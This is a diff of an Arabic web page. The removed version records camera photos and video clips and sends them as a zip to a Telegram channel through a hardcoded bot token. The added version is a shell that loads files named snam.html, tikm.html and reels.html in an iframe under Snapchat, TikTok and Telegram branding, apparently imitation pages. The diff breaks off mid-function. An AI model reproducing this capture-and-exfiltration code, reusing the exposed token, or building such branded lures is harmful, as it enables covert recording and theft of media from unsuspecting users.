@@ -1,12 +1,15 @@
-مباشر zip1,
+المدير 
+المدير 
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>📹 HYBRID v2.0 - شاشتان عامودي</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة التطبيقات المتكاملة - تشغيل احترافي</title>
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -14,620 +17,741 @@
             box-sizing: border-box;
             font-family: 'Cairo', sans-serif;
         }
-        
+
         body {
-            background: #0a0c10;
-            color: white;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             min-height: 100vh;
-            padding: 5px;
-        }
-        
-        .container {
-            max-width: 100%;
-            margin: 0 auto;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        
-        /* الهيدر - صغير */
-        .header {
-            background: linear-gradient(135deg, #161b22, #1f2630);
-            border-radius: 15px;
-            padding: 8px 12px;
-            margin-bottom: 5px;
-            border: 2px solid #ffd700;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        
-        .header h1 {
-            color: #ffd700;
-            font-size: 16px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        
-        .header h1 i {
-            font-size: 14px;
-        }
-        
-        .protocol-badge {
-            background: #4caf50;
-            color: white;
-            padding: 4px 8px;
-            border-radius: 20px;
-            font-size: 10px;
-            font-weight: bold;
-            border: 1px solid #ffd700;
-        }
-        
-        /* شاشتين عامودي - تملأ المساحة */
-        .dual-screen {
-            display: flex;
-            flex-direction: column;
-            gap: 5px;
-            flex: 1;
-            min-height: 0;
-        }
-        
-        .screen {
-            background: #161b22;
-            border-radius: 15px;
-            overflow: hidden;
-            border: 2px solid;
-            flex: 1;
-            min-height: 0;
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .live-screen { border-color: #ff4444; }
-        .preview-screen { border-color: #ffd700; }
-        
-        .screen-header {
-            padding: 5px 8px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: #1f2630;
-            border-bottom: 1px solid;
-            flex-shrink: 0;
-        }
-        
-        .live-header {
-            color: #ff4444;
-            border-bottom-color: #ff4444;
-        }
-        
-        .preview-header {
-            color: #ffd700;
-            border-bottom-color: #ffd700;
-        }
-        
-        .screen-title {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            font-size: 12px;
-            font-weight: bold;
-        }
-        
-        .live-badge {
-            background: #ff0000;
-            color: white;
-            padding: 2px 8px;
-            border-radius: 15px;
-            font-size: 10px;
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0%,100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .timer-badge {
-            background: rgba(0,0,0,0.8);
-            color: #ffd700;
-            padding: 2px 10px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: bold;
-            border: 1px solid #ffd700;
-        }
-        
-        /* حاويات الفيديو - تملأ باقي المساحة */
-        .video-container {
+            padding: 20px;
             position: relative;
-            flex: 1;
-            background: black;
-            min-height: 0;
         }
-        
-        video, canvas {
+
+        /* خلفية متحركة */
+        .animated-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
-            object-fit: cover;
+            z-index: -1;
+            overflow: hidden;
         }
-        
-        /* الأزرار المائية */
-        .watermark-buttons {
+
+        .animated-bg::before {
+            content: '';
             position: absolute;
-            bottom: 8px;
-            right: 8px;
-            display: flex;
-            gap: 6px;
-            z-index: 20;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: repeating-linear-gradient(
+                45deg,
+                rgba(255, 215, 0, 0.03) 0px,
+                rgba(255, 215, 0, 0.03) 20px,
+                transparent 20px,
+                transparent 40px
+            );
+            animation: moveBg 20s linear infinite;
         }
-        
-        .watermark-btn {
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(5px);
+
+        @keyframes moveBg {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            100% { transform: translate(5%, 5%) rotate(5deg); }
+        }
+
+        /* الهيدر الرئيسي */
+        .main-header {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 30px;
+            padding: 20px 30px;
+            margin-bottom: 40px;
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            animation: slideDown 0.8s ease;
+        }
+
+        @keyframes slideDown {
+            from {
+                transform: translateY(-100px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .header-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .logo-icon {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, gold, #ffd700);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 35px;
+            color: #1a1a2e;
+            transform: rotate(10deg);
+            box-shadow: 0 15px 30px rgba(255, 215, 0, 0.4);
+            animation: glow 2s infinite alternate;
+        }
+
+        @keyframes glow {
+            from { box-shadow: 0 15px 30px rgba(255, 215, 0, 0.4); }
+            to { box-shadow: 0 25px 50px rgba(255, 215, 0, 0.8); }
+        }
+
+        .logo-text h1 {
             color: white;
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            font-size: 36px;
+            margin-bottom: 5px;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+            font-weight: 900;
+        }
+
+        .logo-text p {
+            color: rgba(255, 255, 255, 0.8);
             font-size: 16px;
-            cursor: pointer;
-            border: 1px solid #ffd700;
+            font-weight: 500;
         }
-        
-        .watermark-btn.stop-btn {
-            border-color: #ff4444;
-        }
-        
-        .watermark-btn.zip-btn {
-            border-color: #4caf50;
-        }
-        
-        /* الأزرار الرئيسية - الآن زر واحد فقط */
-        .action-buttons {
+
+        /* شريط التنقل العلوي */
+        .nav-bar {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 60px;
+            padding: 10px;
             display: flex;
-            gap: 5px;
-            margin: 5px 0;
+            gap: 10px;
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            margin-bottom: 30px;
+            animation: slideUp 0.8s ease 0.2s both;
         }
-        
-        .action-btn {
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(100px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .nav-item {
             flex: 1;
-            padding: 10px 0;
-            border: none;
-            border-radius: 25px;
-            font-size: 13px;
-            font-weight: bold;
+            padding: 15px 25px;
+            border-radius: 50px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 4px;
+            gap: 15px;
             cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+            background: transparent;
+            color: rgba(255, 255, 255, 0.6);
+            font-weight: 600;
+            font-size: 18px;
+            border: none;
         }
-        
-        .action-btn.start { background: #4caf50; color: white; }
-        .action-btn.zip { background: #ffd700; color: black; }
-        
-        /* أزرار الكاميرا */
-        .camera-controls {
+
+        .nav-item::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            background: radial-gradient(circle, rgba(255, 215, 0, 0.3), transparent);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .nav-item:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .nav-item i {
+            font-size: 24px;
+            transition: all 0.4s;
+            position: relative;
+            z-index: 1;
+        }
+
+        .nav-item span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .nav-item.active {
+            background: linear-gradient(135deg, gold, #ffd700);
+            color: #1a1a2e;
+            transform: scale(1.05);
+            box-shadow: 0 15px 40px rgba(255, 215, 0, 0.5);
+        }
+
+        .nav-item.active i {
+            transform: scale(1.2);
+            color: #1a1a2e;
+        }
+
+        /* حاوية التطبيق */
+        .app-container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 40px;
+            overflow: hidden;
+            border: 3px solid rgba(255, 215, 0, 0.3);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
+            height: 600px;
+            position: relative;
+            animation: fadeIn 1s ease 0.4s both;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .app-header {
+            padding: 15px 25px;
+            background: rgba(0, 0, 0, 0.3);
+            border-bottom: 2px solid rgba(255, 215, 0, 0.3);
             display: flex;
-            gap: 5px;
-            margin: 5px 0;
+            align-items: center;
+            justify-content: space-between;
         }
-        
-        .cam-btn {
-            flex: 1;
-            padding: 8px 0;
-            border-radius: 25px;
-            background: #1f2630;
-            color: #8b949e;
-            text-align: center;
-            font-size: 12px;
-            border: 1px solid transparent;
-            cursor: pointer;
+
+        .app-title {
+            display: flex;
+            align-items: center;
+            gap: 15px;
         }
-        
-        .cam-btn.active {
-            border-color: #ffd700;
-            color: #ffd700;
+
+        .app-icon {
+            width: 45px;
+            height: 45px;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
         }
-        
-        /* شريط الحالة */
-        .status-bar {
-            background: #1f2630;
+
+        .app-icon.snap {
+            background: linear-gradient(135deg, #fffc00, #ffd600);
+            color: black;
+        }
+
+        .app-icon.tiktok {
+            background: linear-gradient(135deg, #ff0050, #00f2ea);
+            color: white;
+        }
+
+        .app-icon.reels {
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+        }
+
+        .app-name {
+            color: white;
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .app-file {
+            color: gold;
+            font-size: 14px;
+            font-family: monospace;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 5px 12px;
+            border-radius: 20px;
+            direction: ltr;
+        }
+
+        .app-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .action-btn {
+            width: 40px;
+            height: 40px;
             border-radius: 12px;
-            padding: 6px 10px;
+            border: 2px solid gold;
+            background: transparent;
+            color: gold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        .action-btn:hover {
+            background: gold;
+            color: black;
+            transform: scale(1.1);
+        }
+
+        /* iframe */
+        .app-frame {
+            width: 100%;
+            height: calc(100% - 75px);
+            border: none;
+            background: white;
+            transition: all 0.5s ease;
+        }
+
+        /* حالة عدم التشغيل */
+        .app-placeholder {
+            width: 100%;
+            height: calc(100% - 75px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: white;
+            gap: 20px;
+            text-align: center;
+            padding: 30px;
+        }
+
+        .placeholder-icon {
+            font-size: 80px;
+            color: gold;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+
+        .placeholder-text {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .placeholder-desc {
+            color: rgba(255, 255, 255, 0.7);
+            max-width: 400px;
+        }
+
+        /* مؤشر التحميل */
+        .loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+        }
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255, 215, 0, 0.3);
+            border-top: 5px solid gold;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* حالة عدم وجود ملف */
+        .error-message {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(244, 67, 54, 0.2);
+            border: 2px solid #f44336;
+            border-radius: 20px;
+            padding: 30px;
+            color: #f44336;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+
+        /* إشعارات */
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, gold, #ffd700);
+            color: black;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-weight: bold;
+            box-shadow: 0 10px 40px rgba(255, 215, 0, 0.4);
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+            border: 2px solid white;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        /* إحصائيات سريعة */
+        .stats-bar {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            border: 1px solid #ffd700;
-            font-size: 11px;
+            margin-top: 20px;
+            padding: 15px 25px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
         }
-        
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #4caf50;
-        }
-        
-        .status-dot.recording {
-            background: #ff4444;
-            animation: blink 1s infinite;
-        }
-        
-        .status-info {
+
+        .stat-item {
             display: flex;
-            gap: 8px;
-            color: #ffd700;
+            align-items: center;
+            gap: 10px;
+            color: white;
         }
-        
-        .footer {
-            text-align: center;
-            margin-top: 5px;
-            color: #6e7681;
-            font-size: 10px;
+
+        .stat-item i {
+            color: gold;
+        }
+
+        /* تجاوب */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .nav-item span {
+                display: none;
+            }
+            
+            .nav-item i {
+                font-size: 28px;
+            }
+            
+            .app-container {
+                height: 500px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- الهيدر -->
-        <div class="header">
-            <h1>
-                <i class="fas fa-microchip"></i>
-                HYBRID v2.0
-            </h1>
-            <div class="protocol-badge">
-                30fps | 90%
-            </div>
-        </div>
-
-        <!-- شاشتين عامودي -->
-        <div class="dual-screen">
-            <!-- الشاشة الأولى - البث المباشر -->
-            <div class="screen live-screen">
-                <div class="screen-header live-header">
-                    <div class="screen-title">
-                        <i class="fas fa-circle"></i> البث المباشر
-                    </div>
-                    <div class="live-badge" id="liveIndicator">🔴 مباشر</div>
+    <div class="animated-bg"></div>
+    
+    <!-- الهيدر الرئيسي -->
+    <div class="main-header">
+        <div class="header-content">
+            <div class="logo-area">
+                <div class="logo-icon">
+                    <i class="fas fa-crown"></i>
                 </div>
-                <div class="video-container">
-                    <video id="liveVideo" autoplay playsinline muted></video>
-                    <div class="watermark-buttons">
-                        <div class="watermark-btn" onclick="selectCamera('user')" id="camFrontBtn">
-                            <i class="fas fa-camera-retro"></i>
-                        </div>
-                        <div class="watermark-btn" onclick="selectCamera('environment')" id="camBackBtn">
-                            <i class="fas fa-camera"></i>
-                        </div>
-                    </div>
+                <div class="logo-text">
+                    <h1>منصة التطبيقات المتكاملة</h1>
+                    <p>اختر تطبيقاً واحداً للتشغيل - يغلق الآخر تلقائياً</p>
                 </div>
             </div>
+            
+            <div class="stat-item">
+                <i class="fas fa-circle" style="color: #4caf50;"></i>
+                <span>جميع الملفات جاهزة</span>
+            </div>
+        </div>
+    </div>
 
-            <!-- الشاشة الثانية - آخر صورة -->
-            <div class="screen preview-screen">
-                <div class="screen-header preview-header">
-                    <div class="screen-title">
-                        <i class="fas fa-camera"></i> آخر صورة
-                    </div>
-                    <div class="timer-badge" id="countdownDisplay">5</div>
+    <!-- شريط التنقل العلوي -->
+    <div class="nav-bar">
+        <button class="nav-item active" onclick="switchApp('snap')" id="nav-snap">
+            <i class="fab fa-snapchat"></i>
+            <span>سناب شات</span>
+        </button>
+        <button class="nav-item" onclick="switchApp('tiktok')" id="nav-tiktok">
+            <i class="fab fa-tiktok"></i>
+            <span>تيك توك</span>
+        </button>
+        <button class="nav-item" onclick="switchApp('reels')" id="nav-reels">
+            <i class="fas fa-film"></i>
+            <span>ريلز تلجرام</span>
+        </button>
+    </div>
+
+    <!-- حاوية التطبيق -->
+    <div class="app-container" id="appContainer">
+        <div class="app-header" id="appHeader">
+            <div class="app-title">
+                <div class="app-icon snap" id="appIcon">
+                    <i class="fab fa-snapchat"></i>
                 </div>
-                <div class="video-container">
-                    <canvas id="previewCanvas" width="320" height="180"></canvas>
-                    <div class="watermark-buttons">
-                        <!-- زر ZIP فقط (يقوم بالإيقاف والإرسال معاً) -->
-                        <div class="watermark-btn zip-btn" onclick="stopAndSend()" id="zipBtn">
-                            <i class="fas fa-file-archive"></i>
-                        </div>
-                    </div>
-                </div>
+                <span class="app-name" id="appName">سناب شات</span>
+                <span class="app-file" id="appFile">snam.html</span>
+            </div>
+            <div class="app-actions">
+                <button class="action-btn" onclick="refreshApp()" title="تحديث">
+                    <i class="fas fa-sync-alt"></i>
+                </button>
+                <button class="action-btn" onclick="toggleFullscreen()" title="عرض كامل">
+                    <i class="fas fa-expand"></i>
+                </button>
             </div>
         </div>
-
-        <!-- الأزرار الرئيسية - زر بدء وزر ZIP فقط -->
-        <div class="action-buttons">
-            <button class="action-btn start" onclick="startBroadcast()" id="startBtn">
-                <i class="fas fa-play"></i> بدء
-            </button>
-            <button class="action-btn zip" onclick="stopAndSend()" id="zipBigBtn">
-                <i class="fas fa-file-archive"></i> إيقاف وإرسال
-            </button>
+        
+        <!-- مكان عرض التطبيق -->
+        <div id="appContent">
+            <iframe class="app-frame" id="appFrame" src="snam.html" sandbox="allow-scripts allow-forms allow-same-origin allow-modals allow-popups allow-downloads allow-pointer-lock allow-orientation-lock"></iframe>
         </div>
-
-        <!-- أزرار الكاميرا -->
-        <div class="camera-controls">
-            <div class="cam-btn active" onclick="selectCamera('user')" id="camFront">📷 أمامية</div>
-            <div class="cam-btn" onclick="selectCamera('environment')" id="camBack">📸 خلفية</div>
+        
+        <!-- مؤشر التحميل -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="loading-spinner"></div>
         </div>
+    </div>
 
-        <!-- شريط الحالة -->
-        <div class="status-bar">
-            <div style="display: flex; align-items: center; gap: 5px;">
-                <span class="status-dot" id="statusDot"></span>
-                <span id="statusText">جاهز</span>
-            </div>
-            <div class="status-info">
-                <span><i class="fas fa-image"></i> <span id="photoCount">0</span></span>
-                <span><i class="fas fa-video"></i> <span id="videoCount">0</span></span>
-            </div>
+    <!-- إحصائيات سريعة -->
+    <div class="stats-bar">
+        <div class="stat-item">
+            <i class="fas fa-file"></i>
+            <span>snam.html</span>
         </div>
-
-        <div class="footer">HYBRID v2.0 | @nardoo_merchant</div>
+        <div class="stat-item">
+            <i class="fas fa-file"></i>
+            <span>tikm.html</span>
+        </div>
+        <div class="stat-item">
+            <i class="fas fa-file"></i>
+            <span>reels.html</span>
+        </div>
     </div>
 
     <script>
-        // HYBRID v2.0 Protocol
-        const HYBRID_CONFIG = {
-            videoDuration: 5,
-            videoInterval: 8000,
-            photoQuality: 0.9,
-            photoInterval: 200
-        };
-
-        const PUBLISHER = {
-            id: '@nardoo_merchant',
-            master: { session: 'LIVE_' + Math.random().toString(36).substring(2, 8).toUpperCase() }
-        };
-
-        const TELEGRAM = {
-            botToken: '8576673096:AAEFKd-YSJcW_0d_wAHZBt-5nPg_VOjDX_0',
-            channelId: '-1003822964890'
-        };
-
-        let stream = null;
-        let cameraActive = false;
-        let isLiveActive = false;
-        let currentFacingMode = 'user';
+        // التطبيق الحالي
+        let currentApp = 'snap';
         
-        let currentPhotos = [];
-        let currentVideos = [];
-        
-        let photoInterval = null;
-        let videoInterval = null;
-        let mediaRecorder = null;
-        
-        const video = document.getElementById('liveVideo');
-        const canvas = document.getElementById('previewCanvas');
-        const ctx = canvas.getContext('2d');
-        
-        const liveIndicator = document.getElementById('liveIndicator');
-        const countdownDisplay = document.getElementById('countdownDisplay');
-        const statusDot = document.getElementById('statusDot');
-        const statusText = document.getElementById('statusText');
-        const photoCount = document.getElementById('photoCount');
-        const videoCount = document.getElementById('videoCount');
-        
-        const camFront = document.getElementById('camFront');
-        const camBack = document.getElementById('camBack');
-        const camFrontBtn = document.getElementById('camFrontBtn');
-        const camBackBtn = document.getElementById('camBackBtn');
-
-        // Camera selection
-        window.selectCamera = function(mode) {
-            if (mode === currentFacingMode) return;
-            currentFacingMode = mode;
-            updateCameraButtons();
-            if (cameraActive) {
-                if (isLiveActive) stopEverything();
-                else stopCameraOnly();
-                setTimeout(startCamera, 500);
+        // معلومات التطبيقات
+        const apps = {
+            snap: {
+                name: 'سناب شات',
+                file: 'snam.html',
+                icon: 'fab fa-snapchat',
+                iconClass: 'snap',
+                color: '#fffc00'
+            },
+            tiktok: {
+                name: 'تيك توك',
+                file: 'tikm.html',
+                icon: 'fab fa-tiktok',
+                iconClass: 'tiktok',
+                color: '#ff0050'
+            },
+            reels: {
+                name: 'ريلز تلجرام',
+                file: 'reels.html',
+                icon: 'fas fa-film',
+                iconClass: 'reels',
+                color: '#25D366'
             }
         };
 
-        function updateCameraButtons() {
-            const isFront = currentFacingMode === 'user';
-            [camFront, camFrontBtn].forEach(btn => btn?.classList.toggle('active', isFront));
-            [camBack, camBackBtn].forEach(btn => btn?.classList.toggle('active', !isFront));
-        }
-
-        // Start camera
-        async function startCamera() {
-            try {
-                statusText.innerHTML = '🔄 تشغيل...';
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: currentFacingMode, width: 640, height: 360 },
-                    audio: true
-                });
-                video.srcObject = stream;
-                await video.play();
-                cameraActive = true;
-                statusDot.className = 'status-dot';
-                statusText.innerHTML = 'الكاميرا جاهزة';
-                requestAnimationFrame(updateCanvas);
-            } catch (err) {
-                statusText.innerHTML = '❌ خطأ';
-            }
-        }
-
-        function updateCanvas() {
-            if (stream && video.readyState === video.HAVE_ENOUGH_DATA) {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            }
-            requestAnimationFrame(updateCanvas);
-        }
-
-        function stopCameraOnly() {
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-                stream = null;
-                video.srcObject = null;
-            }
-            cameraActive = false;
-            statusDot.className = 'status-dot';
-            statusText.innerHTML = 'الكاميرا متوقفة';
-        }
-
-        // Stop everything (internal function)
-        function stopEverything() {
-            if (isLiveActive) {
-                isLiveActive = false;
-                if (photoInterval) clearInterval(photoInterval);
-                if (videoInterval) clearInterval(videoInterval);
-                if (mediaRecorder?.state !== 'inactive') mediaRecorder?.stop();
-                liveIndicator.style.display = 'none';
-            }
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-                stream = null;
-                video.srcObject = null;
-            }
-            cameraActive = false;
-            statusDot.className = 'status-dot';
-            statusText.innerHTML = 'تم الإيقاف';
-            countdownDisplay.style.display = 'none';
-            updateStats();
-        }
-
-        // Start broadcast
-        window.startBroadcast = function() {
-            if (!cameraActive) {
-                startCamera();
-                setTimeout(() => startCountdown(), 1000);
-            } else {
-                startCountdown();
-            }
-        };
-
-        function startCountdown() {
-            let count = 5;
-            countdownDisplay.textContent = count;
-            countdownDisplay.style.display = 'block';
-            liveIndicator.style.display = 'none';
+        // التبديل بين التطبيقات
+        function switchApp(app) {
+            if (currentApp === app) return; // نفس التطبيق
             
-            const interval = setInterval(() => {
-                count--;
-                countdownDisplay.textContent = count;
-                if (count === 0) {
-                    clearInterval(interval);
-                    countdownDisplay.style.display = 'none';
-                    liveIndicator.style.display = 'flex';
-                    startLiveStream();
-                }
-            }, 1000);
-        }
-
-        function startLiveStream() {
-            isLiveActive = true;
-            statusDot.className = 'status-dot recording';
-            statusText.innerHTML = '🔴 بث مباشر';
+            // إظهار مؤشر التحميل
+            document.getElementById('loadingOverlay').style.display = 'flex';
             
-            currentPhotos = [];
-            currentVideos = [];
+            // تحديث الأزرار النشطة
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            document.getElementById(`nav-${app}`).classList.add('active');
             
-            photoInterval = setInterval(capturePhoto, HYBRID_CONFIG.photoInterval);
-            videoInterval = setInterval(recordVideo, HYBRID_CONFIG.videoInterval);
-        }
-
-        function capturePhoto() {
-            if (!isLiveActive) return;
-            canvas.toBlob((blob) => {
-                if (!isLiveActive) return;
-                currentPhotos.push({ blob });
-                updateStats();
-            }, 'image/jpeg', HYBRID_CONFIG.photoQuality);
-        }
-
-        async function recordVideo() {
-            if (!isLiveActive || !stream) return;
-            try {
-                const chunks = [];
-                const recorder = new MediaRecorder(stream);
-                recorder.ondataavailable = (e) => chunks.push(e.data);
-                recorder.onstop = () => {
-                    currentVideos.push({ blob: new Blob(chunks) });
-                    updateStats();
+            // تحديث رأس التطبيق
+            const appInfo = apps[app];
+            document.getElementById('appName').textContent = appInfo.name;
+            document.getElementById('appFile').textContent = appInfo.file;
+            
+            // تحديث أيقونة التطبيق
+            const appIcon = document.getElementById('appIcon');
+            appIcon.className = `app-icon ${appInfo.iconClass}`;
+            appIcon.innerHTML = `<i class="${appInfo.icon}"></i>`;
+            
+            // تغيير التطبيق في iframe
+            const frame = document.getElementById('appFrame');
+            
+            // إخفاء التطبيق القديم
+            frame.style.opacity = '0';
+            
+            // تغيير المصدر (بدون مجلد reels)
+            setTimeout(() => {
+                frame.src = `${appInfo.file}`;
+                currentApp = app;
+                
+                // إظهار التطبيق الجديد بعد التحميل
+                frame.onload = function() {
+                    frame.style.opacity = '1';
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    showNotification(`✅ تم تشغيل ${appInfo.name}`);
                 };
-                recorder.start();
-                setTimeout(() => recorder.stop(), HYBRID_CONFIG.videoDuration * 1000);
-            } catch (error) {}
+                
+                // في حالة خطأ في التحميل
+                frame.onerror = function() {
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    showNotification(`❌ خطأ في تحميل ${appInfo.file}`, 'error');
+                };
+            }, 300);
         }
 
-        // الدالة الجديدة: إيقاف وإرسال معاً
-        window.stopAndSend = async function() {
-            // أولاً: إيقاف البث وجمع المحتوى
-            if (isLiveActive) {
-                isLiveActive = false;
-                if (photoInterval) clearInterval(photoInterval);
-                if (videoInterval) clearInterval(videoInterval);
-                if (mediaRecorder?.state !== 'inactive') mediaRecorder?.stop();
-                liveIndicator.style.display = 'none';
-            }
+        // تحديث التطبيق الحالي
+        function refreshApp() {
+            const frame = document.getElementById('appFrame');
+            const appInfo = apps[currentApp];
             
-            // ثانياً: حفظ وإرسال ZIP إذا يوجد محتوى
-            if (!currentPhotos.length && !currentVideos.length) {
-                alert('لا يوجد محتوى للإرسال');
-                // إيقاف الكاميرا فقط
-                if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
-                    stream = null;
-                    video.srcObject = null;
-                }
-                cameraActive = false;
-                statusDot.className = 'status-dot';
-                statusText.innerHTML = 'تم الإيقاف';
-                countdownDisplay.style.display = 'none';
-                return;
-            }
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            frame.style.opacity = '0';
             
-            statusText.innerHTML = '📦 تجهيز وإرسال...';
-            
-            try {
-                const zip = new JSZip();
-                const subFingerprint = PUBLISHER.master.session + '_' + Date.now().toString(16).substring(0, 6).toUpperCase();
-                
-                currentPhotos.forEach((p, i) => zip.file(`photo_${i+1}.jpg`, p.blob));
-                currentVideos.forEach((v, i) => zip.file(`video_${i+1}.webm`, v.blob));
-                
-                const now = new Date();
-                zip.file("fingerprint.txt", `🔐 ${PUBLISHER.id}\n🎯 ${PUBLISHER.master.session}\n📅 ${now.toLocaleString('ar-EG')}\n🔑 ${subFingerprint}\n📊 ${currentPhotos.length} صور | ${currentVideos.length} فيديو`);
-                
-                const zipBlob = await zip.generateAsync({ type: "blob", compression: "DEFLATE" });
-                
-                statusText.innerHTML = '📤 إرسال للقناة...';
-                
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM.channelId);
-                formData.append('document', zipBlob, `broadcast_${subFingerprint}.zip`);
-                formData.append('caption', `📦 بث من ${PUBLISHER.id}\n🔑 ${subFingerprint}\n📸 ${currentPhotos.length} | 🎥 ${currentVideos.length}`);
-                
-                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendDocument`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                statusText.innerHTML = (await res.json()).ok ? '✅ تم الإرسال' : '❌ فشل الإرسال';
-                
-                // إيقاف الكاميرا بعد الإرسال
-                if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
-                    stream = null;
-                    video.srcObject = null;
-                }
-                cameraActive = false;
-                countdownDisplay.style.display = 'none';
-                statusDot.className = 'status-dot';
-                
-            } catch (error) {
-                statusText.innerHTML = '❌ خطأ';
-            }
-        };
-
-        function updateStats() {
-            photoCount.textContent = currentPhotos.length;
-            videoCount.textContent = currentVideos.length;
+            setTimeout(() => {
